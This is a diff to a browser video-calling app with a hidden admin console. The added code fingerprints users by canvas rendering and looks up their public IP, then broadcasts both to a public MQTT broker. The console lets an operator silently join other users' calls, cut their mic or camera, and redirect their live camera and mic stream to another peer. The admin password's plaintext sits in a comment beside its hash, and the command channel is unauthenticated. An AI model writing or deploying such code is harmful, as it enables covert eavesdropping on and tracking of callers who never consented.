@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HoneyXCalling</title>
+    <title>Honey</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
     <style>
@@ -38,7 +38,7 @@
 
         /* Admin Dashboard Windows UI */
         .admin-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 100; align-items: center; justify-content: center; color: #333; }
-        .admin-content { background: white; padding: 25px; border-radius: 20px; width: 95%; max-width: 650px; box-shadow: 0px 10px 30px rgba(0,0,0,0.3); text-align: left; max-height: 90vh; overflow-y: auto; }
+        .admin-content { background: white; padding: 25px; border-radius: 20px; width: 95%; max-width: 700px; box-shadow: 0px 10px 30px rgba(0,0,0,0.3); text-align: left; max-height: 90vh; overflow-y: auto; }
         .admin-content h2 { margin-top: 0; color: #ff3b30; border-bottom: 2px solid #f0f2f5; padding-bottom: 10px; }
         
         .tracker-stats { display: flex; justify-content: space-between; background: #f0f2f5; padding: 10px 15px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; }
@@ -57,14 +57,45 @@
         .admin-input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px; margin-bottom: 10px; box-sizing: border-box; }
         .admin-btn { padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; background: #ff3b30; color: white; width: 100%; font-size: 16px; margin-top: 10px; }
         .badge { background: #007aff; color: white; padding: 2px 6px; border-radius: 10px; font-size: 11px; }
+
+        /* Real-time Un-dismissible Ban Overlay */
+        #ban-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #0f0f11;
+            color: #ff3b30;
+            z-index: 999999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 30px;
+            box-sizing: border-box;
+        }
+        #ban-overlay h1 { font-size: 3rem; margin-bottom: 10px; letter-spacing: 1px; }
+        #ban-overlay p { font-size: 1.2rem; color: #a4a4a8; margin-bottom: 30px; max-width: 500px; line-height: 1.5; }
+        #ban-overlay .info-block { background: #1c1c1e; padding: 15px; border-radius: 10px; border: 1px solid #2c2c2e; font-family: monospace; color: #ff9500; font-size: 0.95rem; }
     </style>
 </head>
 <body>
 
+<div id="ban-overlay">
+    <h1>🚫 ACCESS RESTRICTED</h1>
+    <p>This hardware node has been restricted by an admin. Any attempts to bypass this using secondary browsers or network masks are actively logged.</p>
+    <div class="info-block" id="ban-identity-card">
+        Loading system blacklist parameters...
+    </div>
+</div>
+
 <div id="announcement-box" class="announcement-bar"></div>
 
 <div class="phone-container">
-    <h3>HoneyXCalling</h3>
+    <h3>Shaswat - The Developer</h3>
     <div id="my-number" class="status">Generating ID...</div>
     <input type="text" id="phone-screen" class="screen" placeholder="Enter ID to Dial" readonly />
     
@@ -98,7 +129,7 @@
     </div>
     <div class="video-wrapper">
         <video id="remote-video" autoplay playsinline></video>
-        <span class="video-label">Dost</span>
+        <span class="video-label">Remote Friend/Spy Monitor</span>
     </div>
 </div>
 
@@ -116,9 +147,9 @@
             <div class="user-item" style="color: #888; text-align: center;">Mapping data channels...</div>
         </div>
 
-        <label style="font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px; color: #ff3b30;">🛡️ System Banned Registry (Persistent):</label>
+        <label style="font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px; color: #ff3b30;">🛡️ Active Global Blacklist Registry:</label>
         <div class="user-list-container" id="ban-list" style="border-color: #ff3b30; max-height: 150px;">
-            <div class="user-item" style="color: #888; text-align: center;">No globally banned devices.</div>
+            <div class="user-item" style="color: #888; text-align: center;">No globally banned systems.</div>
         </div>
         
         <label style="font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px;">Universal Execution Vectors:</label>
@@ -134,12 +165,14 @@
 
 <script>
     const ADMIN_TRIGGER = "1818";
-    const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa323831c"; // plain-text equivalent fallback word is "Honey"
+    const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa323831c"; // SHA-256 of "Honey"
+
+    let myPublicIP = "Unknown IP";
+    let myCanvasFingerprint = "Unknown-HW";
     
-    if (!localStorage.getItem('device_fingerprint_id')) {
-        localStorage.setItem('device_fingerprint_id', 'DEV-' + Math.random().toString(36).substring(2, 10).toUpperCase());
-    }
-    const deviceId = localStorage.getItem('device_fingerprint_id');
+    const deviceId = localStorage.getItem('device_fingerprint_id') || 'DEV-' + Math.random().toString(36).substring(2, 10).toUpperCase();
+    localStorage.setItem('device_fingerprint_id', deviceId);
+
     const sessionToken = Math.random().toString(36).substring(2, 9);
     const myPhoneNumber = Math.floor(1000 + Math.random() * 9000).toString();
     
@@ -156,15 +189,41 @@
     let masterAdminToken = null;
 
     let activeUsersRegistry = {}; 
-    
-    if (localStorage.getItem('is_permanently_banned') === 'true') {
-        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh; font-family: sans-serif;'>🚫 HARDWARE DISCONNECTOR VECTOR APPLIED: You are permanently banned from this ecosystem.</h1>";
-        throw new Error("Execution halted due to ban.");
-    }
 
+    // MQTT Connect details (Using EMQX WebSocket sandbox broker)
     const mqttClient = mqtt.connect('wss://broker.emqx.io:8084/mqtt');
     const SYSTEM_PRESENCE = "web_dialer_presence_secure_prod_alpha_88";
     const SYSTEM_COMMANDS = "web_dialer_commands_secure_prod_alpha_88";
+
+    // 1. GENERATE HARDEST-TO-BYPASS CLIENT FINGERPRINT (Canvas Render Engine Profiling)
+    function generateCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(10, 10, 50, 20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("EnterpriseSec#1!", 5, 5);
+            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+            ctx.fillText("🎨🌟👽", 12, 18);
+            
+            const rawData = canvas.toDataURL();
+            let hash = 0;
+            for (let i = 0; i < rawData.length; i++) {
+                hash = (hash << 5) - hash + rawData.charCodeAt(i);
+                hash |= 0; 
+            }
+            return "HW-" + Math.abs(hash).toString(16).toUpperCase();
+        } catch (e) {
+            return "HW-FALLBACK-" + navigator.hardwareConcurrency + "-" + screen.colorDepth;
+        }
+    }
+
+    myCanvasFingerprint = generateCanvasFingerprint();
 
     mqttClient.on('connect', () => {
         mqttClient.subscribe(SYSTEM_PRESENCE);
@@ -189,6 +248,8 @@
                 const data = JSON.parse(rawMsg);
                 activeUsersRegistry[data.token] = {
                     deviceId: data.deviceId,
+                    hwId: data.hwId,
+                    ipAddress: data.ipAddress || "Unknown IP",
                     roomCode: data.roomCode,
                     micEnabled: data.micEnabled,
                     camEnabled: data.camEnabled,
@@ -196,10 +257,13 @@
                     lastSeen: Date.now()
                 };
 
+                // Admin check incoming presence maps against persistent blacklist
                 if (amIAdminActive) {
-                    const bans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
-                    if (bans.includes(data.deviceId)) {
-                        dispatchCmd('ban', data.token, { targetDevice: data.deviceId });
+                    const blacklistedIPs = JSON.parse(localStorage.getItem('admin_banned_ips') || '[]');
+                    const blacklistedHWs = JSON.parse(localStorage.getItem('admin_banned_hws') || '[]');
+                    
+                    if (blacklistedIPs.includes(data.ipAddress) || blacklistedHWs.includes(data.hwId)) {
+                        dispatchCmd('blacklist_enforce', data.token, { targetIP: data.ipAddress, targetHW: data.hwId });
                     }
                 }
                 
@@ -223,25 +287,35 @@
                         setTimeout(() => { box.style.display = 'none'; }, 8000);
                     }
                 }
+                
                 if (cmd.type === "toggle_theme") {
                     document.body.classList.toggle('dark-theme');
                 }
 
-                if (cmd.type === "unban" && cmd.targetDevice === deviceId) {
-                    localStorage.removeItem('is_permanently_banned');
-                    alert("🔓 Admin has lifted your ban! Reconnecting...");
-                    location.reload();
+                // --- REAL-TIME UNBAN ENFORCEMENT ENGINE ---
+                if (cmd.type === "unban" && (cmd.targetIP === myPublicIP || cmd.targetHW === myCanvasFingerprint)) {
+                    document.getElementById('ban-overlay').style.display = "none";
+                    localStorage.removeItem('local_blacklist_flag');
+                    console.log("🔓 Real-time clearance received. Restoring terminal connectivity.");
+                    return;
                 }
 
-                if (cmd.target === sessionToken || cmd.targetDevice === deviceId) {
+                // --- REAL-TIME BAN ENFORCEMENT ENGINE ---
+                const isMyIPBanned = cmd.targetIP && cmd.targetIP === myPublicIP;
+                const isMyHWBanned = cmd.targetHW && cmd.targetHW === myCanvasFingerprint;
+                const isMyTokenBanned = cmd.target === sessionToken;
+
+                if (cmd.type === "blacklist_enforce" && (isMyIPBanned || isMyHWBanned || isMyTokenBanned)) {
+                    localStorage.setItem('local_blacklist_flag', 'true');
+                    applyBanUI(cmd.targetIP || myPublicIP, cmd.targetHW || myCanvasFingerprint);
+                    if (currentCall) currentCall.close();
+                }
+
+                // Standard Administration commands
+                if (cmd.target === sessionToken) {
                     if (cmd.type === "kick") {
-                        alert("🔴 Admin disconnected your runtime session execution.");
+                        alert("🔴 Admin disconnected your runtime session.");
                         location.reload();
-                    }
-                    if (cmd.type === "ban") {
-                        localStorage.setItem('is_permanently_banned', 'true');
-                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh; font-family: sans-serif;'>🚫 HARDWARE DISCONNECTOR VECTOR APPLIED: You are permanently banned from this ecosystem.</h1>";
-                        if(currentCall) currentCall.close();
                     }
                     if (cmd.type === "lock_audio") {
                         adminAudioLocked = true; setAudioState(false);
@@ -259,7 +333,7 @@
                     }
                     if (cmd.type === "redirect") {
                         if(currentCall) currentCall.close();
-                        alert(`🔀 System Redirect Engine: Connecting directly to [${cmd.connectTo}]`);
+                        alert(`🔀 Redirect Connect Sequence: Attaching to [${cmd.connectTo}]`);
                         if(localStream) {
                             const call = peer.call(cmd.connectTo, localStream);
                             call.on('stream', function(remStream) {
@@ -273,6 +347,18 @@
         }
     });
 
+    // Handle initial state loads securely
+    if (localStorage.getItem('local_blacklist_flag') === 'true') {
+        applyBanUI(myPublicIP, myCanvasFingerprint);
+    }
+
+    function applyBanUI(ip, hw) {
+        const overlay = document.getElementById('ban-overlay');
+        const card = document.getElementById('ban-identity-card');
+        overlay.style.display = "flex";
+        card.innerHTML = `IDENTIFIED IP: ${ip}<br>HARDWARE SIGNATURE: ${hw}<br>STATE: ACTIVE SANCTION`;
+    }
+
     function broadcastPresence() {
         const micOn = localStream && localStream.getAudioTracks().length > 0 && localStream.getAudioTracks()[0].enabled;
         const camOn = localStream && localStream.getVideoTracks().length > 0 && localStream.getVideoTracks()[0].enabled;
@@ -280,6 +366,8 @@
         mqttClient.publish(SYSTEM_PRESENCE, JSON.stringify({
             token: sessionToken,
             deviceId: deviceId,
+            hwId: myCanvasFingerprint,
+            ipAddress: myPublicIP,
             roomCode: myPhoneNumber,
             micEnabled: !!micOn,
             camEnabled: !!camOn,
@@ -320,8 +408,8 @@
                 listContainer.innerHTML += `
                     <div class="user-item">
                         <div class="user-row">
-                            <span>Token: <strong>${t}</strong> | HW ID: <code style="background:#e4e6eb; padding:2px 4px; border-radius:4px; color:#333;">${user.deviceId}</code>${selfBadge}</span>
-                            <span style="color: #25d366; font-weight: bold;">Room ID: ${user.roomCode}</span>
+                            <span>Token: <strong>${t}</strong> | IP: <code style="background:#007aff; padding:2px 6px; border-radius:4px; color:white; font-weight:bold;">${user.ipAddress}</code>${selfBadge}</span>
+                            <span style="color: #25d366; font-weight: bold;">HW Fingerprint: <code>${user.hwId}</code></span>
                         </div>
                         <div class="user-row">
                             <span style="font-size:11px; color:#c60000; font-weight:bold;">${streamStateStr}</span>
@@ -333,7 +421,7 @@
                                 <button class="action-btn mute" onclick="dispatchCmd('lock_video', '${t}')">Kill Cam</button>
                                 <button class="action-btn unmute" onclick="dispatchCmd('unlock_video', '${t}')">Allow Cam</button>
                                 <button class="action-btn kick" onclick="dispatchCmd('kick', '${t}')">Kick</button>
-                                <button class="action-btn ban" onclick="banHardwareDevice('${user.deviceId}', '${t}')">Ban Device</button>
+                                <button class="action-btn ban" style="background:#cc0000;" onclick="banSystem('${user.ipAddress}', '${user.hwId}', '${t}')">BAN DEVICE + IP</button>
                             </div>
                         </div>
                     </div>
@@ -343,17 +431,22 @@
 
         const banListContainer = document.getElementById('ban-list');
         if (banListContainer) {
-            const bans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
-            if (bans.length === 0) {
-                banListContainer.innerHTML = `<div class="user-item" style="color: #888; text-align: center;">No globally banned devices.</div>`;
+            const ips = JSON.parse(localStorage.getItem('admin_banned_ips') || '[]');
+            const hws = JSON.parse(localStorage.getItem('admin_banned_hws') || '[]');
+            
+            if (ips.length === 0 && hws.length === 0) {
+                banListContainer.innerHTML = `<div class="user-item" style="color: #888; text-align: center;">No globally banned systems.</div>`;
             } else {
                 banListContainer.innerHTML = "";
-                bans.forEach(banId => {
+                
+                // Render list of target blocks in local admin DB
+                ips.forEach((ip, idx) => {
+                    const matchedHW = hws[idx] || "N/A";
                     banListContainer.innerHTML += `
                         <div class="user-item" style="background: #fff5f5; border-left: 4px solid #ff3b30; padding: 8px 12px; margin-bottom: 5px;">
                             <div class="user-row">
-                                <span style="color:#333;">Device ID: <strong style="color:#ff3b30;">${banId}</strong></span>
-                                <button class="action-btn unban" onclick="unbanHardwareDevice('${banId}')">UNBAN</button>
+                                <span style="color:#333;">IP: <strong style="color:#ff3b30;">${ip}</strong> | HW: <strong style="color:#ff3b30;">${matchedHW}</strong></span>
+                                <button class="action-btn unban" onclick="unbanSystem('${ip}', '${matchedHW}')">UNBAN</button>
                             </div>
                         </div>
                     `;
@@ -362,30 +455,46 @@
         }
     }
 
-    function banHardwareDevice(targetHWID, targetToken) {
-        if (targetHWID === deviceId) return alert("Security Override: You cannot ban your own Admin node!");
-        let currentBans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
-        if (!currentBans.includes(targetHWID)) {
-            currentBans.push(targetHWID);
-            localStorage.setItem('admin_banned_devices', JSON.stringify(currentBans));
+    function banSystem(targetIP, targetHW, targetToken) {
+        if (targetIP === myPublicIP || targetHW === myCanvasFingerprint) {
+            return alert("Security Override: You cannot blacklist your own control center!");
         }
-        dispatchCmd('ban', targetToken, { targetDevice: targetHWID });
+        
+        let bannedIPs = JSON.parse(localStorage.getItem('admin_banned_ips') || '[]');
+        let bannedHWs = JSON.parse(localStorage.getItem('admin_banned_hws') || '[]');
+        
+        if (!bannedIPs.includes(targetIP)) bannedIPs.push(targetIP);
+        if (!bannedHWs.includes(targetHW)) bannedHWs.push(targetHW);
+        
+        localStorage.setItem('admin_banned_ips', JSON.stringify(bannedIPs));
+        localStorage.setItem('admin_banned_hws', JSON.stringify(bannedHWs));
+        
+        dispatchCmd('blacklist_enforce', targetToken, { targetIP: targetIP, targetHW: targetHW });
         updateAdminUI();
     }
 
-    function unbanHardwareDevice(targetHWID) {
-        let currentBans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
-        currentBans = currentBans.filter(id => id !== targetHWID);
-        localStorage.setItem('admin_banned_devices', JSON.stringify(currentBans));
+    function unbanSystem(targetIP, targetHW) {
+        let bannedIPs = JSON.parse(localStorage.getItem('admin_banned_ips') || '[]');
+        let bannedHWs = JSON.parse(localStorage.getItem('admin_banned_hws') || '[]');
         
-        mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "unban", targetDevice: targetHWID }));
+        bannedIPs = bannedIPs.filter(ip => ip !== targetIP);
+        bannedHWs = bannedHWs.filter(hw => hw !== targetHW);
+        
+        localStorage.setItem('admin_banned_ips', JSON.stringify(bannedIPs));
+        localStorage.setItem('admin_banned_hws', JSON.stringify(bannedHWs));
+        
+        // Broadcast active real-time unban clear signal to anyone listening on MQTT
+        mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "unban", targetIP: targetIP, targetHW: targetHW }));
         updateAdminUI();
     }
 
     function syncBanListToClients() {
-        const bans = JSON.parse(localStorage.getItem('admin_banned_devices') || '[]');
-        bans.forEach(banId => {
-            mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "ban", targetDevice: banId }));
+        const ips = JSON.parse(localStorage.getItem('admin_banned_ips') || '[]');
+        const hws = JSON.parse(localStorage.getItem('admin_banned_hws') || '[]');
+        
+        ips.forEach((bannedIP, idx) => {
+            const bannedHW = hws[idx] || "N/A";
+            mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "blacklist_enforce", targetIP: bannedIP, targetHW: bannedHW }));
         });
     }
 
@@ -413,11 +522,12 @@
         mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "broadcast", message: msg }));
         document.getElementById('broadcast-msg').value = "";
     }
+    
     function sendThemeToggle() { mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "toggle_theme" })); }
 
     function spyCall(targetRoomId) {
         if(currentCall) currentCall.close();
-        alert(`🕵️ Joining Call Matrix Pipeline for node room: [${targetRoomId}]`);
+        alert(`🕵️ Joining Target Signal Loop: [${targetRoomId}]`);
         if(localStream) {
             const call = peer.call(targetRoomId, localStream);
             call.on('stream', function(remStream) {
@@ -453,6 +563,18 @@
         }
     }
     
+    // IP Fetch logic (with automatic ban execution if already in database)
+    async function resolvePublicIP() {
+        try {
+            const response = await fetch("https://api.ipify.org?format=json");
+            const data = await response.json();
+            myPublicIP = data.ip;
+            console.log("Resolved Public Network IP: " + myPublicIP);
+        } catch (e) {
+            console.error("Failed to resolve public IP address through gateway.");
+        }
+    }
+    
     function toggleLocalVideo() {
         if (adminVideoLocked || !localStream || !localStream.getVideoTracks().length) return;
         setVideoState(!localStream.getVideoTracks()[0].enabled);
@@ -462,7 +584,9 @@
     function press(num) { document.getElementById('phone-screen').value += num; }
     function clearScreen() { document.getElementById('phone-screen').value = ''; }
 
-    function initMedia() {
+    async function initMedia() {
+        await resolvePublicIP();
+        
         navigator.mediaDevices.getUserMedia({ audio: true, video: true })
             .then(s => { localStream = s; document.getElementById('local-video').srcObject = s; })
             .catch(() => {
@@ -489,7 +613,7 @@
             clearScreen();
             
             if(masterAdminToken !== null) {
-                return alert("⛔ CRITICAL EXCLUSION: An active Admin Engine instance is currently running globally.");
+                return alert("⛔ CRITICAL EXCLUSION: An active Admin Console instance is running globally on another device.");
             }
 
             const pwd = prompt("🔒 Enter Admin Security Access Password:");
